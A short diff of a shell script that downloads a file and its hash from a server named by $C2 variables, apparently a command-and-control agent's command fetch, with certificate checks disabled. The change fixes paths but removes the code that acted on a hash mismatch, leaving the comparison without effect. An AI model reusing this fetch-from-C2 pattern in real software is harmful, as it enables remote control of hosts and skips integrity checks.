@@ -19,16 +19,9 @@ if [ -f "$LOKIHOME/$MYNAME" ]; then
         $WGET -O $LOKIHOME/$MYNAME.hash --no-check-certificate "$C2PROTO$C2/$MYNAME.hash"
 
         # Create a hash of the file that we downloaded to compare to the hash that we downloaded
-    sha256sum $MYNAME > $LOKIHOME/$MYNAME.check
-	$DIFF $MYNAME.hash $MYNAME.check
-	if [ $? == 1 ]; then
-		$LOG "[ALERT] Command File Download did not match hash"
-	else
-		$ECHO "Hash Match, Moving On"
-		mv $LOKIHOME/$MYNAME $LOKIHOME/$MYNAME-command.txt
-		rm $LOKIHOME/$MYNAME.check
-		rm $LOKIHOME/$MYNAME.hash 
-	fi 
+    sha256sum $LOKIHOME/$MYNAME > $LOKIHOME/$MYNAME.check
+	$DIFF $LOKIHOME/$MYNAME.hash $LOKIHOME/$MYNAME.check
+	
 else
     $ECHO "No $LOKIHOME/$MYNAME-command.txt found"
 fi
